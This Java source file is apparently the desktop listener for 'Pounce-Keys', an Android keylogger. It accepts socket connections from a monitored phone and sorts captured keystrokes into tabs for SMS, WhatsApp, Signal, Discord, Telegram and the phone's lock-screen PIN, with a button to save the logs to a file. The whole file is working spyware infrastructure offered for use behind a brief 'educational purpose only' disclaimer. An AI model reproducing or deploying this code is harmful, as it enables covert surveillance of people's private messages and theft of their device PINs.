// KreaByte Terabyte@protonmail.ch
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.swing.Box;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.text.DefaultCaret;



public class MessageListener {

    public static void main(String[] args) {
        // Get the user's current local IP address
        String localIP = "";
try {
    InetAddress[] addresses = InetAddress.getAllByName(InetAddress.getLocalHost().getHostName());
    for (InetAddress address : addresses) {
        if (!address.isLoopbackAddress() && !address.isLinkLocalAddress() && !address.isAnyLocalAddress() && !address.isMulticastAddress() ) {
            localIP = address.getHostAddress();
            break;
        }
    }
} catch (UnknownHostException e) {
    localIP = "Error: Unable to determine local IP address";
}



        // Create input dialogs to get IP address and port number
        JTextField ipField = new JTextField(localIP, 20);
        JTextField portField = new JTextField("4444", 20);
        JPanel myPanel = new JPanel();
        myPanel.add(new JLabel("IP address:"));
        myPanel.add(ipField);
        myPanel.add(Box.createHorizontalStrut(15));
        myPanel.add(new JLabel("Port number:"));
        myPanel.add(portField);
        
        

        int result = JOptionPane.showConfirmDialog(null, myPanel, "Server Configuration", JOptionPane.OK_CANCEL_OPTION);
        if (result == JOptionPane.CANCEL_OPTION) {
            System.exit(0);
        }
        String ip = ipField.getText();
        String port = portField.getText();
        int portNum = Integer.parseInt(port);

        JFrame frame = new JFrame("Pounce-Keys");
        frame.getContentPane().setBackground(new Color(57,62,64));
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        ImageIcon icon = new ImageIcon("icon.png");
        frame.setIconImage(icon.getImage());
        JTabbedPane tabbedPane = new JTabbedPane();
        JTextArea textArea1 = new JTextArea();
        JTextArea textArea2 = new JTextArea();
        JTextArea textArea3 = new JTextArea();
        JTextArea textArea4 = new JTextArea();
        JTextArea textArea5 = new JTextArea();
        JTextArea textArea6 = new JTextArea();
        JTextArea textArea7 = new JTextArea();
        JTextArea textArea8 = new JTextArea();

        textArea1.setBackground(new Color(14, 150, 226));
        textArea1.setForeground(new Color(0, 0, 0));

        //textArea1.setForeground(new Color(190, 66, 133));
       // textArea1.setBackground(new Color(0, 0, 0));
        textArea2.setForeground(new Color(190, 66, 133));
        textArea2.setBackground(new Color(0, 0, 0));
        textArea3.setForeground(new Color(190, 66, 133));
        textArea3.setBackground(new Color(0, 0, 0));
        textArea4.setForeground(new Color(190, 66, 133));
        textArea4.setBackground(new Color(0, 0, 0));
        textArea5.setForeground(new Color(190, 66, 133));
        textArea5.setBackground(new Color(0, 0, 0));
        textArea6.setForeground(new Color(190, 66, 133));
        textArea6.setBackground(new Color(0, 0, 0));
        textArea7.setForeground(new Color(190, 66, 133));
        textArea7.setBackground(new Color(0, 0, 0));
        textArea8.setForeground(new Color(190, 66, 133));
        textArea8.setBackground(new Color(0, 0, 0));


        // Add auto-scrolling to All Logs
        DefaultCaret caret1 = (DefaultCaret)textArea1.getCaret();
        caret1.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
        tabbedPane.addTab("All Logs", new JScrollPane(textArea1));
        

        // Add auto-scrolling to SMS
        DefaultCaret caret5 = (DefaultCaret)textArea5.getCaret();
        caret5.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
        tabbedPane.addTab("SMS", new JScrollPane(textArea5));
        tabbedPane.setBackgroundAt(tabbedPane.indexOfTab("SMS"), Color.BLACK);
        tabbedPane.setForegroundAt(tabbedPane.indexOfTab("SMS"), Color.WHITE);

        

        // Add auto-scrolling to WhatsApp
        DefaultCaret caret6 = (DefaultCaret)textArea6.getCaret();
        caret6.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
        tabbedPane.addTab("WhatsApp", new JScrollPane(textArea6));
        int index = -1;
for(int i = 0; i < tabbedPane.getTabCount(); i++) {
    if(tabbedPane.getTitleAt(i).equals("WhatsApp")) {
        index = i;
        break;
    }
}
if(index != -1) {
    tabbedPane.setBackgroundAt(index, new Color(75, 201, 91));

    tabbedPane.setForegroundAt(index, new Color(239, 239, 239));
}

 // Add auto-scrolling to Telegram
 DefaultCaret caret8 = (DefaultCaret)textArea8.getCaret();
 caret8.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
 tabbedPane.addTab("Telegram", new JScrollPane(textArea8));
 
for(int i = 0; i < tabbedPane.getTabCount(); i++) {
if(tabbedPane.getTitleAt(i).equals("Telegram")) {
 index = i;
 break;
}
}
if(index != -1) {
tabbedPane.setBackgroundAt(index, new Color(50, 168, 226));

tabbedPane.setForegroundAt(index, new Color(239, 239, 239));
}

        // Add auto-scrolling to device pin
        DefaultCaret caret4 = (DefaultCaret)textArea4.getCaret();
        caret4.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
        tabbedPane.addTab("phone pin", new JScrollPane(textArea4));
        for(int i = 0; i < tabbedPane.getTabCount(); i++) {
    if(tabbedPane.getTitleAt(i).equals("phone pin")) {
        index = i;
        break;
    }
}
if(index != -1) {
    tabbedPane.setBackgroundAt(index, new Color(172, 5, 0));

    tabbedPane.setForegroundAt(index, Color.WHITE);
}

        // Add auto-scrolling to Signal
        DefaultCaret caret2 = (DefaultCaret)textArea2.getCaret();
        caret2.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
        tabbedPane.addTab("Signal", new JScrollPane(textArea2));
        for(int i = 0; i < tabbedPane.getTabCount(); i++) {
    if(tabbedPane.getTitleAt(i).equals("Signal")) {
        index = i;
        break;
    }
}
if(index != -1) {
    tabbedPane.setBackgroundAt(index, new Color(58, 118, 240));
    tabbedPane.setForegroundAt(index, Color.WHITE);
}



        // Add auto-scrolling to Discord
        DefaultCaret caret3 = (DefaultCaret)textArea3.getCaret();
        caret3.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
        tabbedPane.addTab("Discord", new JScrollPane(textArea3));
        
for(int i = 0; i < tabbedPane.getTabCount(); i++) {
    if(tabbedPane.getTitleAt(i).equals("Discord")) {
        index = i;
        break;
    }
}
if(index != -1) {
    tabbedPane.setBackgroundAt(index, new Color(114, 137, 218));

    tabbedPane.setForegroundAt(index, Color.WHITE);
}
        frame.add(tabbedPane, BorderLayout.CENTER);
        frame.setSize(600, 400);
        frame.setVisible(true);

        // about page
        DefaultCaret caret7 = (DefaultCaret)textArea7.getCaret();
        tabbedPane.addTab("About", new JScrollPane(textArea7));
        textArea7.setText("Leave a star if you enjoy my work 💜// kreabyte,Terabyte@protonmail.ch // github.com/KreaByte/pounce-keys // save logs button saves logs.txt in current location from the logs tab. the ip and port you chose to listen on in android should be the same set here when asked.   // ⚖️ Legal Disclaimer: For Educational Purpose Only. Usage of Pounce-Keys for attacking or monitoring targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Use Responsibly!");
        textArea7.setEditable(false);
        textArea7.setLineWrap(true);
        textArea7.setWrapStyleWord(true);


        JButton saveButton = new JButton("Save Logs");
saveButton.addActionListener(new ActionListener() {
public void actionPerformed(ActionEvent e) {
File selectedFile = new File("logs.txt");
try (PrintWriter writer = new PrintWriter(selectedFile)) {
writer.print(textArea1.getText());
} catch (FileNotFoundException ex) {
ex.printStackTrace();
}
}
});
frame.add(saveButton, BorderLayout.SOUTH);
saveButton.setBackground(new Color(44, 48, 50));
saveButton.setForeground(new Color(16, 187, 255));


    
    boolean signalFilterOn = false;
    boolean discordFilterOn = false;
    boolean messagingFilterOn = false;
    boolean whatsAppFilterOn = false;
    boolean pinFilterOn = false;
    boolean TelegramFilterOn = false;

        // ...
        
        
        // FILTERING start with signal being first
        try {
            try (ServerSocket serverSocket = new ServerSocket(portNum, 50, InetAddress.getByName(ip))) {
                textArea1.append("Server started on IP address: " + serverSocket.getInetAddress().getHostAddress() + " and port: " + serverSocket.getLocalPort() + "\n");
      
                while (true) {
                    Socket socket = serverSocket.accept();
                    BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    StringBuilder message = new StringBuilder();
                    int c;
                    while((c = in.read()) != -1) {
                        if (c == '\n') {
                            break;
                        }
                        message.append((char) c);
                    }
                    if (message.toString().equals("Signal")) {
                        signalFilterOn = true;
                    } else if (message.toString().equals("Keyboard hidden") || message.toString().equals("Recent apps") || message.toString().startsWith("Home screen")) {
                        signalFilterOn = false;
                    } else if (signalFilterOn) {
                        textArea2.append(message.toString() + "\n");
                    }
                    
                    // ...
                
                    if (message.toString().startsWith("Discord")) {
                        discordFilterOn = true;
                        } else if (message.toString().equals("Keyboard hidden") || message.toString().equals("Recent apps") || message.toString().startsWith("Home screen")) {
                        discordFilterOn = false;
                        } else if (discordFilterOn) {
                        textArea3.append(message.toString() + "\n");
                        }

                        // ...
                
                    if (message.toString().equals("Telegram")) {
                        TelegramFilterOn = true;
                        } else if (message.toString().equals("Keyboard hidden") || message.toString().equals("Recent apps") || message.toString().startsWith("Home screen")) {
                        TelegramFilterOn = false;
                        } else if (TelegramFilterOn) {
                        textArea8.append(message.toString() + "\n");
                        }
                
                    // ...
                
                    if (message.toString().equals("Messaging")) {
                        messagingFilterOn = true;
                    } else if (message.toString().equals("Keyboard hidden") || message.toString().equals("Recent apps") || message.toString().startsWith("Home screen")) {
                        messagingFilterOn = false;
                    } else if (messagingFilterOn) {
                        textArea5.append(message.toString() + "\n");
                    }
                
                    // ...
                
                    if (message.toString().equals("WhatsApp")) {
                        whatsAppFilterOn = true;
                    } else if (message.toString().equals("Keyboard hidden") || message.toString().equals("Recent apps") || message.toString().startsWith("Home screen")) {
                        whatsAppFilterOn = false;
                    } else if (whatsAppFilterOn) {
                        textArea6.append(message.toString() + "\n");
                    }
                
                    // ...
                
                    if (message.toString().equals("Pin unlock.") || message.toString().equals("Enter your PIN") || message.toString().equals("Device locked")) {
                        pinFilterOn = true;
                    } else if (message.toString().contains("Enter") || message.toString().contains("Lock screen") || message.toString().contains("Home screen")) {
                        pinFilterOn = false;
                    } else if (pinFilterOn) {
                        textArea4.append(message.toString() + "\n");
}

                    //get the current time 
      Date date = new Date();
      //create formatter for the date
      SimpleDateFormat formatter = new SimpleDateFormat("MMM-dd h:mm a");
      //format date
      String dateString = formatter.format(date);
      textArea1.append(dateString + " : " + message.toString() + "\n");

                    socket.close();
                }
            }
        } catch (IOException e) {
            textArea1.append("Error: " + e.getMessage() + "\n");
        }
    }
}
